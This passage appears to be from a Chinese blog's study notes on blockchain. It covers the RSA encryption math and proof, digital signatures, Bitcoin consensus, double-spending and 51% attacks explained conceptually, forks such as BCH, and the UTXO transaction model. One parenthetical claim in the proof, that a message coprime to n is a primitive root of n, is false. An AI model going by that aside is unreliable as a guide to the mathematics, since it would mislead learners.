<li>$\varphi(n)&#x3D;(p-1)(q-1)$,只有知道p和q才能算出$\varphi(n)$</li>
<li>$n&#x3D;p*q$ 只有将n因数分解才能算出p和q</li>
</ol>
<p><strong>结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。</strong></p>
<p>可是，大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。p和q数字越大,破解难度越高,当然对应的加密解密时间也越长</p>
<p>例如:</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　12301866845301177551304949<br>　　　　　　　　　　　　　　　　58384962720772853569595334<br>　　　　　　　　　　　　　　　　79219732245215172640050726<br>　　　　　　　　　　　　　　　　36575187452021997864693899<br>　　　　　　　　　　　　　　　　56474942774063845925192557<br>　　　　　　　　　　　　　　　　32630345373154826850791702<br>　　　　　　　　　　　　　　　　61221429134616704292143116<br>　　　　　　　　　　　　　　　　02221240479274737794080665<br>　　　　　　　　　　　　　　　　351419597459856902143413</p>
</blockquote>
<p>它等于这样两个质数的乘积：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　33478071698956898786044169<br>　　　　　　　　　　　　　　　　84821269081770479498371376<br>　　　　　　　　　　　　　　　　85689124313889828837938780<br>　　　　　　　　　　　　　　　　02287614711652531743087737<br>　　　　　　　　　　　　　　　　814467999489<br>　　　　　　　　　　　　　　　　　　×<br>　　　　　　　　　　　　　　　　36746043666799590428244633<br>　　　　　　　　　　　　　　　　79962795263227915816434308<br>　　　　　　　　　　　　　　　　76426760322838157396665112<br>　　　　　　　　　　　　　　　　79233373417143396810270092<br>　　　　　　　　　　　　　　　　798736308917</p>
</blockquote>
<p>事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。</p>
<h4 id="加密解密过程"><a href="#加密解密过程" class="headerlink" title="加密解密过程"></a>加密解密过程</h4><p><strong>（1）加密要用公钥 (n,e)</strong></p>
<p>假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。</p>
<p>所谓”加密”，就是算出下式的c：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^e ≡ c (mod n)$</p>
</blockquote>
<p>爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$65^{17} ≡ 2790 (mod 3233)$</p>
</blockquote>
<p>于是，c等于2790，鲍勃就把2790发给了爱丽丝。</p>
<p><strong>（2）解密要用私钥(n,d)</strong></p>
<p>爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$c^d ≡ m (mod n)$</p>
</blockquote>
<p>也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$2790^{2753} ≡ 65 (mod 3233)$</p>
</blockquote>
<p>因此，爱丽丝知道了鲍勃加密前的原文就是65。</p>
<p>至此，”加密–解密”的整个过程全部完成。</p>
<p>我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。</p>
<p>你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种”对称性加密算法”（比如<a href="https://zh.wikipedia.org/wiki/%E8%B5%84%E6%96%99%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86">DES</a>），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。</p>
<h4 id="私钥解密证明"><a href="#私钥解密证明" class="headerlink" title="私钥解密证明"></a>私钥解密证明</h4><p>最后，我们来证明，为什么用私钥解密，一定可以正确地得到m。也就是证明下面这个式子：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$c^d ≡ m (mod n)$</p>
</blockquote>
<p>因为，根据加密规则</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$ｍ^e ≡ c (mod n)$</p>
</blockquote>
<p>于是，c可以写成下面的形式：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$c &#x3D; m^e - k*n$</p>
</blockquote>
<p>将c代入要我们要证明的那个解密规则：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(m^e - k*n)^d ≡ m (mod n)$</p>
</blockquote>
<p>它等同于求证</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{e*d} ≡ m (mod n)$</p>
</blockquote>
<p>由于</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$e*d ≡ 1 (mod φ(n))$</p>
</blockquote>
<p>所以</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$e<em>d &#x3D; h</em>φ(n)+1$</p>
</blockquote>
<p>将ed代入：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{h*φ(n)+1} ≡ m (mod n)$</p>
</blockquote>
<p>接下来，分成两种情况证明上面这个式子。</p>
<p><strong>（1）m与n互质(如果m与n互质,则m是n的原根)。</strong></p>
<p>根据欧拉定理，此时</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{φ(n)}≡ 1 (mod n)$</p>
</blockquote>
<p>得到</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(m^{φ(n)})^h * m ≡ m (mod n)$</p>
</blockquote>
<p>原式得到证明。</p>
<p><strong>（2）m与n不是互质关系。</strong></p>
<p>此时，由于n等于质数p和q的乘积，所以m必然等于k*p或k*q。</p>
<blockquote>
<p>因为m与n不是互质关系，说明m与n有共同的公因子g，假设m&#x3D;hg，由于n&#x3D;pq，p与q互质，n只有p和q两个因子，所以g和h必然有一个等于q或者p， 所以才有结论“m必然等于kp或kq”</p>
</blockquote>
<p>以 m &#x3D; kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(k*p)^{q-1} ≡ 1 (mod q)$</p>
</blockquote>
<p>进一步得到</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$[(k<em>p)^{q-1}]^{h(p-1)} *  k</em>p ≡ k*p  (mod q)$</p>
</blockquote>
<p>即</p>
<blockquote>
<p>　　　　　　　　$(k<em>p)^{e</em>d} ≡ k*p (mod q)$</p>
</blockquote>
<p>将它改写成下面的等式</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(k<em>p)^{e</em>d} &#x3D; t<em>q + k</em>p$</p>
</blockquote>
<p>这时t必然能被p整除，即 t&#x3D;t’*p</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(k<em>p)^{ed} &#x3D; t’<em>p</em>q + k</em>p$</p>
</blockquote>
<p>因为 m&#x3D;kp，n&#x3D;pq，所以</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{e*d} ≡ m (mod n)$</p>
</blockquote>
<p>原式得到证明。</p>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>数字签名</p>
<h3 id="ECC椭圆曲线加密"><a href="#ECC椭圆曲线加密" class="headerlink" title="ECC椭圆曲线加密"></a>ECC椭圆曲线加密</h3><p>RSA算法是当前使用最广的非对称加密算法。但是RSA的缺点在于为了抵抗攻击，不得不增加公钥的长度。而随着长度的增加，计算量和复杂度也不断增加。正是因为非对称加密复杂度太高，所以一般仅用于在网络连接建立时的密钥协商过程。而且随着数字大小的增加，分解的效率会提高，乘法和分解的难度差距会减小。</p>
<p>所以RSA并不是将来密码学中最理想的系统。在理想的trapdoor函数中，正向计算（简单的计算）和反向计算（复杂计算）的难度应该随着数字的增加同步地增加。 所以需要更好的trapdoor函数。</p>
<h3 id="非对称加密在区块链中的应用"><a href="#非对称加密在区块链中的应用" class="headerlink" title="非对称加密在区块链中的应用"></a>非对称加密在区块链中的应用</h3><p>具体实现:</p>
<ol>
<li>首先生成一对公私钥 (pk,sk)。 pk是公钥，sk是私钥。</li>
<li>签名sign。sig &#x3D; sign(sk, message) ,使用私钥对一份消息message进行处理，譬如先对message进行哈希得到摘要，然后使用私钥对摘要进行加密。</li>
<li>验证verify。 verify(pk, message, sig)。验证方法，获得输入message，签名的结果sig，以及公钥。譬如，可以使用公钥对签名结果进行解密，对message进行同样散列得到的摘要，比较解密的结果和摘要结果，如果两个相同，这验证通过，否则，验证失败。</li>
</ol>
<h1 id="区块链技术6-去中心化"><a href="#区块链技术6-去中心化" class="headerlink" title="区块链技术6:去中心化"></a>区块链技术6:去中心化</h1><p>去中心化问题:分布式一致性性问题</p>
<p>分布式好处是更加可靠</p>
<p>对于去中心化，比特币区块链主要面临的五个问题：</p>
<ol>
<li>谁维护交易账本？</li>
<li>谁能决定交易是否是有效的？</li>
<li>谁创建新的比特币？</li>
<li>谁决定系统变化的规则？</li>
<li>比特币如何获得交易的价值？</li>
</ol>
<h2 id="分布式共识（distributed-consensus"><a href="#分布式共识（distributed-consensus" class="headerlink" title="分布式共识（distributed consensus)"></a>分布式共识（distributed consensus)</h2><p>给出分布式共识协议的一个定义和描述：</p>
<p>有 n 个节点，每个节点都有输入值。有一些节点出故障或者是恶意的。分布式共识协议的特点是：</p>
<ul>
<li>必须能够使得所有的诚实节点就输入值达成一致</li>
<li>该最终一致的值是由诚实节点产生的</li>
</ul>
<h2 id="区块链共识算法"><a href="#区块链共识算法" class="headerlink" title="区块链共识算法"></a>区块链共识算法</h2><p>在区块链中，一次交易可能是Alice从Bob那里买了一本书，或者是其它物品，这可以线下商议，然后Alice需要支付给Bob一个比特币。在比特币网络中，Alice需要广播一条消息，譬如“Alice支付给Bob 1个比特币。”并且使用私钥对消息进行签名。</p>
<p>现在的问题是，Bob如何能确认，自己确实能够收到这个比特币，然后将Alice购买的物品发给她。</p>
<p>比特币系统的特殊之处在于：</p>
<ol>
<li>引入了激励机制。因为比特币本身就是一种货币，所以参与者有强烈的意愿能获得这个奖励。也就是说，维持整个系统正常工作才符合大多数人的利益。</li>
<li>比特币的随机性。比特币网络中的共识并不是一下子就确定的，在实际中，差不多是一个小时之后，基本可以认为对一个区块或者一笔交易进行了确认。但是，即使在这个时候，也还不能确认100%。而是，随着时间的流逝，确认性会逐渐增强。</li>
</ol>
<p>比特币网络实现的是<strong>隐含共识</strong>（implicit consensus）：一个区块就是一个共识的过程，随机的节点可以提出新区块。即使提出新区块的节点是恶意的，提出时也没有显示的投票或者其他过程。建立共识的过程是隐式的，其它节点如果接受这个区块，就会延伸它；否则拒绝这个区块，则会无视它，并尝试建立新区块去取代它。</p>
<p>简化的比特币的共识算法过程如下：（这里没有讨论广播新区块的节点是如何选出的）</p>
<ol>
<li>向所有的节点广播新的交易。</li>
<li>每个节点将新交易打包进区块。</li>
<li>每一轮中一个随机的节点广播该区块。</li>
<li>如果区块中所有的交易都是有效的（比特币没有重花，签名正确等），则其他节点接受这个区块；</li>
<li>节点表示接受该区块的方式是在之后新创建的区块中包括这个块的哈希。</li>
</ol>
<p>针对这个算法讨论一下在货币网络中可能的攻击方法。</p>
<ol>
<li>偷比特币。Alice有没有可能去使用其他用户的比特币呢？譬如Alice创建了一个区块，区块中她试图伪造一个交易“Bob发送10个比特币给Alice。”如果要让这个交易合法，那么Alice必须能够伪造Bob的签名，但是Alice如果没有Bob的私钥，那么Alice就不能伪造签名。所以，只要底层的密码学基础没有被破坏，Alice就不可能偷Bob的币。</li>
<li>拒绝服务。如果Alice非常讨厌Bob，她不愿意为Bob提供服务，譬如在自己创建的区块中，Alice就会故意忽略掉Bob相关的交易。这个攻击的问题是，Alice并不能控制区块的产生。即使Alice在一个区块中忽略了Bob的交易，其他诚实的节点会在交易中包括Bob的交易。</li>
<li>双重支付。假设Alice从Bob购买了一个软件，然后她广播了一条交易“Alice付给Bob一些比特币”。诚实的节点看到了这条交易，并且将交易包含在区块中。当Bob看到这条交易被包括进去的时候，Bob认为Alice已经支付了，所以将软件发送给了Alice。然后Alice开始准备攻击，她自己或者她控制的节点开始准备下一个区块，在这个区块中包含的消息是把Alice刚才付给Bob的币付给自己或者她控制的账号“Alice付给Alice一些比特币”。如果Alice能够给成功地将第二条支付信息包含在区块链中，那么第一条消息，将会被忽视，就像从来没有出现过一样。</li>
</ol>
<p>下面是双重支付的示例图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233997.jpg" alt="img"></p>
<p>Alice可以构造一个新的交易，将支付给Bob的钱再支付给自己。如果她能控制后续区块的产生，那么付给Bob的交易会像从来没有存在过一样。</p>
<p>问题是，双重攻击能否成功，完全取决于区块链到底沿着那条链延续。诚实的节点会沿着最长的链创建自己的区块。所以答案就是，没有正确的答案。</p>
<p>在Alice创建了双重攻击的区块之后，对于其他的节点而言，两个分支具有一样的长度；而且两个块都是有效的，那么其他节点会选择哪个分支就决定了攻击成功与否。但是对于其他的节点而言，这两个交易的地位是完全相同的。我们认为Alice付给自己的交易是欺骗，那是因为我们知道Alice首先付给了Bob。但是，对于没有全局时间的网络而言，这两个交易是等价的。而且Alice还可以通过一些方法使得下一个区块沿着自己的分支延伸。</p>
<p>那么Bob如何应对这个问题呢？</p>
<p>如果Bob容易轻信，那么他可能在发现Alice发布了付币给自己的时候就同意将软件发给Alice，这个时候，称作Zero-Confirmation Transaction（零确认交易）。如果Bob有更多的保护自己的意识，他会等到Alice付钱给自己的交易被多次确认之后才将软件发给Alice。当交易被包含在区块中，称作一次确认；如果包含交易的区块之后又来了一个区块，称作2次确认。以此类推。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233998.jpg" alt="img"></p>
<p>只要Bob等足够的时间，那么当他发现包含Alice付钱给自己的区块已经被遗弃的时候，他会放弃这次交易并且拒绝将软件发给Alice。一般而言，一个交易获得的确认越多，这个交易成为最终的系统的共识的概率越大。</p>
<p>在比特币系统中的一般做法是等6个确认。6是在等待时间和确认之间的一个折中。</p>
<p>综上，能够防止双重支付成功的原因，也即，包括双重支付的区块不能最终包括在链中的原因是我们假设大部分的节点是诚实的。从密码学的角度，两个交易都是正确的。 所以，为了确认形成了共识，需要等待一段时间，确定最终区块链中到底包含了哪一个块。而且，随着区块的增加（确认数的增加），交易变无效的可能性是指数级降低的。因此，可以等待6个区块，也即差不多1个小时的时间，基本上不会再翻盘了。</p>
<p>激励和工作证明（PoW）</p>
<p>在之前的过程中，我们多次做了假设，大部分的节点是诚实节点——诚实的节点会将自己收到的广播的交易打包，诚实的节点会沿着最长的分支扩展。但是，节点有没有必要保持诚实呢？或者说，能不能给节点激励，让节点维持诚实？</p>
<p>实际上，即使能够证明有的节点正在尝试进行双重支付攻击，因为节点没有标识，所以即使发现，也不能进行惩罚。所以，问题变成了，如果节点保持诚实，能不能获得奖励？同样的，因为如果节点没有身份标识，不可能寄支票给诚实的节点，所以，对诚实的形成区块的节点的奖励就是比特币。</p>
<p>在比特币网络中，共有两个激励方式。一种是Block reward（区块奖励），一种是transaction fees（交易费用）。</p>
<p>区块奖励是这样的，任何创造出区块的节点可以在区块中包括一个特殊的交易——创造币的交易，并且节点可以选择交易的接收地址。当然， 节点大概率把接收地址设置为自己。可以理解为这是对节点创造区块的奖励。</p>
<p>目前为止，创造一个区块的奖励是25个币，然后每210,000个区块这个数字会减半。按照生成区块的速度，差不多每四年，区块奖励会减半。</p>
<p>第一眼看来，这个好像没什么用处。因为，不管节点创造的是好的区块还是包括攻击交易的区块，他都能获得奖励。但是，这个奖励什么时候才有用呢？只有在他的区块被包括在长链中才行。因此，如果一个区块中包括无效的交易，这个区块相当于会被丢弃。所以，所有的节点都能尽力表现得诚实，这样，其他节点才会沿着他的区块继续添加新的区块。</p>
<p>同时，区块奖励也是唯一的创建新的比特币的方法。从下图可以看出，每四年比特币的区块奖励降低一半，比特币系统中币的总数设置在21,000，000。也即，总有一天，创建区块不会产生新的币，或者币回报太少，而没有人愿意去创建区块。</p>
<p>那个时候，会不会产生欺诈呢？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233999.jpg" alt="img"></p>
<p><strong>交易费用。</strong>比特币中的第二个激励机制是交易费用。交易的创建者可以在创建交易时，输入大于输出，其中的差值就是交易费用。所以，即使当创建区块不会产生币的时候，交易费用会变得很重要。同时，对于交易者而言，如果希望自己的交易被快速地确认，毫无疑问地，在交易中包括多一点的费用是一个好的方法。</p>
<p>这时候，来理一下思路。</p>
<ol>
<li>我们要求创造新区块的节点是随机的。</li>
<li>我们给创造区块的节点奖励，那样会有很多节点希望参与。</li>
<li>从前两点还会引出的问题是：会不会有节点发动女巫攻击，创造很多的节点以获得奖励？</li>
</ol>
<p>所有三个问题的答案实际上是一个PoW，proof of work。基本思路就是，挑选节点的时候，要根据一种人们不能独占的资源来选择，譬如，算力，computer power。在PoW中，就是让节点进行竞争，算力最强能够胜出，也相当于是按照算力按比例进行选择。</p>
<p>从另一方面来讲，这对希望参与的节点设置了门槛，必须有足够的算力资源才能参与到区块的创建中。因此，即使有人想发动Sybil Attack，如果不能控制更多的算力，创建新的节点是没有用的。</p>
<p>比特币的工作证明就是hash puzzles。为了创建一个区块，节点需要能够找到一个数值，nonce，使得当计算哈希时，前一个hash，包含在区块中的交易，以及nonce这三者连接之后，它的哈希值小于某个target。</p>
<p>用公式写出来，长这样：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233000.jpg" alt="img"></p>
<p>之前我们讲过hash具有的特点是puzzle friendliness，找到这个Nonce的唯一方法就是尝试各种值，直到运气好找到一个。</p>
<p>工作证明的存在基本上实现了对随机性的要求，没有谁能够指定哪个节点可以产生下一个区块；同时，排除了Sybil Attack的可能，创建有竞争力的节点代价太高。</p>
<p>比特币中的hash计算有三个特点。</p>
<ol>
<li>很难计算。在2014年，产生一个区块需要的计算大概是 10^20 次哈希。面对这样的计算量，普通的笔记本电脑根本没有竞争力。也因此，参与计算的行为被称作mining，挖矿。</li>
<li>难度可调节。难度调整逻辑被写在代码中，在每个全节点中独立自动发生。每2016个块，所有的节点一起参与计算，重新定义target。target的目标是，使得每隔10分钟才能产生一个新区块。按照这个速度，每两周，target重新定义一次。这也意味着，随着整个系统的算力增加， 创建一个区块会越来越难。为什么需要10分钟创建一个区块呢？如果不自动调整target，随着算力的增加，创建区块的速度会越来越快，可能打包的交易会变少。当然，速度太慢就不适合一些吞吐量大的服务。所以最佳速度一直是个问题。</li>
<li>验证非常容易。</li>
</ol>
<p>也正是因为工作量证明，保证了如果大部分的节点（以算力而不是个数）是诚实的，那么至少有50%的可能，下一个区块来自于诚实的节点。</p>
<p>总结：</p>
<p>每个人都可以参与比特币协议，而且不需要现实世界的身份，只要创建一对公私钥对就行。而且可以创建任意多的公私钥。交易实际上就是在网络中广播的信息。比特币就是交易的输出。（比特币的最小单位是0.00000001，单位为1聪Satoshi）比特币网络的目标是将交易和新区块向全网广播，网络通过区块链和共识机制保障安全。当我们说交易包括在区块链中，实际上是这个交易获得了多次的确认。</p>
<p>最后，讨论一下51%攻击。</p>
<p>因为之前的假设一直是大部分的节点是诚实的，也就是至少51%的节点是诚实的。那万一攻击者控制了51%的节点呢？或者说，有一个超级强大的矿池，控制了51%的算力呢？</p>
<p>我们来思考一下，此时攻击者可能发起什么攻击。</p>
<p>攻击者可能偷别人的比特币吗？不能。除非能破解密码基础，否则不可能偷到别人的币。如果攻击者想在区块中包括这个签名不正确的币，那么即使有51%的算力控制，也不可能推翻共识机制。即使攻击者创造出了最长的链，但是剩下的其他诚实节点会拒绝接受这条链，而会自己创造另一条链，也就是出现了分叉。当攻击者想把偷来的币花出去时，接收方也会因为不选择攻击者创造的链而拒绝这个交易。</p>
<p>攻击者能不能进行DoS攻击？如果攻击者特别不喜欢Bob，那么确实有可能Bob的交易不会出现在所有的区块中。但是，Bob的交易可以被广播到网络中，所以，即使Bob确实是拒绝服务了，但是至少对于诚实节点而言，能够发现攻击发生了。</p>
<p>最后，能否进行双重支付等其他可以破坏区块链信任的攻击呢？在51%的算力控制下，确实有可能。但是那个时候，一旦人们发觉到比特币网络被人控制，而不再可信，那么人们会主动放弃比特币，那么比特币的价值会直接崩溃。而攻击者呢，考虑到控制51%算力的代价，出现这种情况就相当于所有的投资都会打水漂。</p>
<hr>
<p>来看一下魔幻现实。</p>
<p><strong>比特大陆</strong>，混过币圈或者挖过矿的都知道，<strong>他们是世界上最大的矿机生产商，拥有世界上最大的矿池以及矿场</strong>。是比特币世界的巨无霸。比特大陆的算力到底有多大呢？通过下面的全球算力图来简单分析一下。【下图是2017年11月的时候】</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233001.jpg" alt="img"></p>
<p><a href="https://link.zhihu.com/?target=http://BTC.com">http://BTC.com</a>和AntPool是比特大陆的矿池，这点已毋庸置疑，两者相加已经占全球算力的32.37%。而ViaBTC有比特大陆的投资，BTC.TOP则是江卓尔的，他们与比特大陆基本同仇敌忾。**这4个矿池在图上明眼一看就知道超过了51%。它们相加算力占比达到了62.28%**，还不算其它联盟的算力以及云算力等。</p>
<p><strong>Core团队</strong>这边呢？他们说起来比较像一群极客，<strong>多年来维护维护着比特币这个开源项目，同样也维护者中本聪当年去中心化的思想</strong>。所以Core在商业和挖矿方面并没有太大建树，但是<strong>在国外的社区里一直拥有极高的声誉</strong>。</p>
<p>以比特大陆为代表的大矿工群体，垄断了绝大多数算力。而开发团队Bitcoin Core，则控制了比特币代码的更新权。双方围绕着比特币是否需要扩容的话题，展开了一轮又一轮口水战。</p>
<p>由于比特大陆的力量越来越大，渐渐就影响到了比特币未来的发展路线。两个BOSS一个是在极客世界维护着比特币代码和去中心化思想，而另一个则是带有非常浓厚的商业行为的公司。两者难免在一些事情上声音不同。</p>
<p>BCH（比特现金），这是长达三年扩容争议的产物，是以矿霸比特大陆为核心主导的一次分叉，导致比特币社区在2017年下半年分裂。在比特币网络拥堵的背景下，比特现金主张走大区块路线，号称有更高性能，更高的容量，更低的交易手续费用，正式和比特币展开竞争。</p>
<p>竞争初期，因为有以比特大陆为代表的大矿工群体支持，比特现金似乎看起来有越位比特币之势，其兑换比特币的比例一度达到0.4（1个比特币现金可以兑换到0.4比特币）。</p>
<p>BCH诞生时，币市仍处牛市。分叉带来的恐慌，很快便被牛市的狂热所淹没。而BSV分家时，币圈正值熊市——一个月时间，BCH币价由分叉前的552美元，一路狂泻至74美元，跌去83%。即便计入分叉后产生的BSV，投资者依然损失惨重。</p>
<h4 id="分叉币"><a href="#分叉币" class="headerlink" title="分叉币"></a>分叉币</h4><p>莱特币、狗狗币这些竞争币种，都是独立建立数据，和比特币分离。而BCH、BTG、BCD和比特币共用某个时间节点之前的数据，两者的本质差别在这，共用数据导致，某个时间节点之前持币的用户，自动同时持有两种币。因为用户关注的是持币问题，所以前者不被称为分叉币，而后者被称为分叉币。除了比特币，以太坊ETH目前也有一种分叉币存在，即ETC。</p>
<p>分叉币从软件技术上，“复制并修改”，修改一行代码也是修改，修改100行代码也是修改，本质上是一个意思。从技术上看，不存在正宗不正宗的问题。</p>
<p>同样是硬分叉，另外一种情况，B版本得到广泛支持，而A版本被大面积停用，那么B版本就会继承这个币种正宗的称号，而A版本反而会被改名换姓叫另外一个名字，这都是约定成俗的，没有一个中心化的规定。比如以太坊ETH硬分叉后，作为新版本的B版本还是被大家称为ETH，而A版本被大家改称为ETC。</p>
<p>在A版本仍然得到绝大部分支持的情况下，上面的B1、B2、B3版本为什么能活？也是基于相同的这两点前提，第一点，这些一小撮人搞的B版本，统统修改了难度系数和算法，所以不会十万分钟才出块数据；第二点，这一小撮人技术虽然都是抄的，但是他们专注做了一系列的市场推广，上线交易所等等。</p>
<p>现在分叉就变成了四种情况（结果）：</p>
<p>1、A版本仍然被广泛支持，B版本算力不足消亡，只保留A版本。</p>
<p>2、B版本被广泛支持，A版本算力不足消亡，只保留B版本。</p>
<p>3、A版本和B版本都有相当一部分支持，同时并存。这种情况是最符合严格意义上的硬分叉。这两者是货真价实的分叉币。有一定的门槛（支持率）。到目前为止比特币没有一种这种分叉币产生。</p>
<p>4、A版本仍然被广泛支持，B版本通过代码修改难度系数和算法，一小撮人也能够让它存活下来。这种B版本的分叉币是几乎没有门槛的，到目前为止，这种分叉币几个月内就出来三五种，而且好像还在不断增加（有利可图）。大部分理解比特币的人，把这一类分叉跟其他一千多种竞争币进行等同看待，在国外的一些交易所把BCH称为bcash币而不是bitcoin cash。</p>
<p>根据虎嗅网的报道，</p>
<p><a href="https://www.huxiu.com/article/311309.html">比特币分叉往事</a></p>
<blockquote>
<p>2018年1月13日，比特币市值占整个加密币市场的份额跌至32.45%，创下历史新低。当时很多人都以为<strong>比特币被取代是早晚的事</strong>。<br>对于吴忌寒来说，算力是最大的优势和武器，他希望他主导的分叉币BCH能够取代BTC。<br>但BTC占据了比特币的正统及冠名权，还有9年用户累积与行业生态。<strong>BCH诞生之后，一直面临着一个严峻的挑战，就是没有人认可。</strong><br>再加上Bitcoin Core阵营的反对和大部分行业公司保持观望中立，在BTC分叉后，大部分BCH被用户当成糖果抛售，BCH价格刚出来只有200多美元。<br>分叉后，<strong>吴忌寒一方面通过拉高BCH价格吸引矿工过来挖BCH，另一方面不断抛售BTC，造成BTC价格不稳定</strong>，最终：“很多矿工就会选择继续挖BCH，从而导致比特币算力减少，网络更加拥堵，更多人信心丧失抛售比特币，最后矿工更加转移到BCH，形成恶性循环，导致比特币的崩盘”。<br>于是吴忌寒第一次进攻选择了拉盘。<strong>BCH的价格一路走高，分叉后不到二十天，8月20号价格就猛涨到898美元，翻了三倍多</strong>。矿工们看到BCH有利可图，再加上BTC的算力缩小，交易更拥堵；越来越多的人开始转投BCH，而这进一步导致BCH价格升格，就这样不断循环，BCH价格一路走高。<br>接着吴忌寒第二次进攻开始抢夺比特币的算力。极端情况下，BCH分流了BTC的接近一半的算力，让比特币链上的交易大幅拥堵。然而在11月，BCH算力达到了BTC的两倍，价格仍只有比特币的三分之一，最后BCH算力迅速崩溃再也没超过比特币。</p>
</blockquote>
<h1 id="区块链技术7-比特币的机制-1"><a href="#区块链技术7-比特币的机制-1" class="headerlink" title="区块链技术7:比特币的机制(1)"></a>区块链技术7:比特币的机制(1)</h1><p>比特币的共识机制生成了一个append-only的账本，一旦交易在账本中，再也不能更改。矿工——也即一些有较高计算力的节点，生成区块，并且验证交易是正确的（签名是正确的、币没有重复花费）等。账本和区块链网络使得比特币成为一种货币。在本文中，将介绍一些细节。</p>
<h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><p>区块链实际上就是一个账本，账本就是要记账，账实际就是一笔笔的交易。那首先看一下，使用下面的记账形式效果如何。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233002.jpg" alt="img"></p>
<p>第一个交易是形成区块的奖励25个比特币。Alice将17个币转给Bob，Bob转8个给Carol，Carol转5个给Alice，然后Alice转15个给David。这种记账方式非常符合我们的直觉，因为现实生活中，支付宝、微信、银联都是这么做的。但是这种做法的优缺点是什么？</p>
<p>上面的例子中，前面的几笔交易我们可能都看的很顺，因为根据之前交易的情况，我们很容易判断出交易能够顺利进行。但是看到最后一笔交易的时候就得想一下，Alice有这么多钱支付给David吗？</p>
<p>这种形式的账本也叫作account-based账本，这种记账方式的问题是：必须对每个账户的余额进行查询，才能确定一笔交易是否有效。譬如在最后一个交易的时候，得去查一下Alice的账户，总共还有多少币剩余。像上面的例子中，如果没有全局的数据结构维护用户的余额，那么可能得一路追踪回去到起始交易，看看Alice到底剩多少钱。如果想要快一点，那就得额外地维护数据结构，譬如有一个全局的数据结构，在每次交易后更新账户余额。</p>
<p>由于这样的问题，比特币并没有使用这样account-based的记账方法。比特币的记账方式是类似于这样的：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233003.jpg" alt="img"></p>
<p>每一笔交易指明了输入和输出，每一笔交易有唯一的标识符，每一笔交易可以有多个输入和多个输出。上面的例子做了简化，使得可以方便地使用序号来指代交易。</p>
<p>第一个交易中没有输入，因为它是区块的第一个交易，创造了新的币，Alice作为矿工获得了币，这25个币也是交易1的唯一一个输出，在之后使用1[0]来指代Alice拥有的25个币。在第二个交易中，输入是1[0]，25个币，然后产生了两个输出，2[0]是支付给Bob的17个币，2[1]是剩下的8个币，也形成了一个输出，接收方是Alice自己。在第三个交易中输入是2[0]，也即Bob的17个币，输出是3[0]，付给Carol的8个币，以及3[1]，付给Bob的9个币。在第四个交易中，输入是2[1]，也即Alice的8个币，分别支付给David和Alice。</p>
<p>使用这样的记账方式的好处是可以方便地验证交易的正确性。在验证一个交易时，我们首先找到输入所指向的交易的输出，同时为了确保它并没有被花掉，所以我们需要扫描所指向的交易区块和最新区块之间所有的区块，而不需要找到创世区块。</p>
<p>因为一个交易可以包括多个输入和多个输出，所以可以方便地实现各种目的。譬如，Bob接收到Alice的8个币，收到Carol的2个币，那么Bob可以将创建一个新的交易，将两个交易中的输出作为输入，从而将零钱合并为整钱。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233004.jpg" alt="img"></p>
<p>如果Bob和Carol要同时支付给David，那么在同一个交易中的输入可以包含Bob和Carol的币。在这种情况下， 交易生效的条件同时需要Bob和Carol两人的签名。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233005.jpg" alt="img"></p>
